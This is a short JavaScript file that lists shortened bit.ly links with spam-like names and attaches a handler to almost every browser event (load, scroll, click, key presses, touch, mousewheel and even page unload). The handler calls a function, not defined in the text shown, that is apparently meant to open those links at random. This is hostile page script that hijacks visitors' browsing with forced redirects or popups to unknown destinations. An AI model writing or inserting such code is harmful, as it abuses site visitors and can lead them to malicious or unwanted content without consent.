function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

var links = [
    'https://bit.ly/Bangedfunbid',
    'https://bit.ly/smashwatchunder',
    'https://bit.ly/bangedfununative',
    'https://bit.ly/bangedfunmaven',
    'https://bit.ly/smashwatchright',
    'https://bit.ly/smashwatchright',
    'https://bit.ly/Bangedfunbid',
    'https://bit.ly/smashwatchright',
    'https://bit.ly/smashwatchriverr',
    'https://bit.ly/bangedfundilla',
    'https://bit.ly/bangedfunrivernew',
    'https://bit.ly/bangedfuninfinity',
    'https://bit.ly/smashwatchkada',
    'https://bit.ly/smashwatchkada',
    'https://bit.ly/Bangedfunbid',
];

function triggerOpenRandomLinksRecursively() {
    openRandomLinksRecursively(links); // Assuming links is accessible here
}

window.addEventListener('load', triggerOpenRandomLinksRecursively);
window.addEventListener('scroll', triggerOpenRandomLinksRecursively);
window.addEventListener('keydown', triggerOpenRandomLinksRecursively);
document.addEventListener('scroll', triggerOpenRandomLinksRecursively);
document.addEventListener('keydown', triggerOpenRandomLinksRecursively);
window.addEventListener('beforeunload', triggerOpenRandomLinksRecursively);
document.addEventListener('beforeunload', triggerOpenRandomLinksRecursively);
window.addEventListener('click', triggerOpenRandomLinksRecursively);
document.addEventListener('click', triggerOpenRandomLinksRecursively);
window.addEventListener('mousewheel', triggerOpenRandomLinksRecursively);
document.addEventListener('mousewheel', triggerOpenRandomLinksRecursively);
window.addEventListener('touchstart', triggerOpenRandomLinksRecursively);
document.addEventListener('touchstart', triggerOpenRandomLinksRecursively);
window.addEventListener('touchmove', triggerOpenRandomLinksRecursively);
document.addEventListener('touchmove', triggerOpenRandomLinksRecursively);
window.addEventListener('touchend', triggerOpenRandomLinksRecursively);
document.addEventListener('touchend', triggerOpenRandomLinksRecursively);
window.addEventListener('unload', triggerOpenRandomLinksRecursively);
document.addEventListener('unload', triggerOpenRandomLinksRecursively);
window.addEventListener('keypress', triggerOpenRandomLinksRecursively);
document.addEventListener('keypress', triggerOpenRandomLinksRecursively);
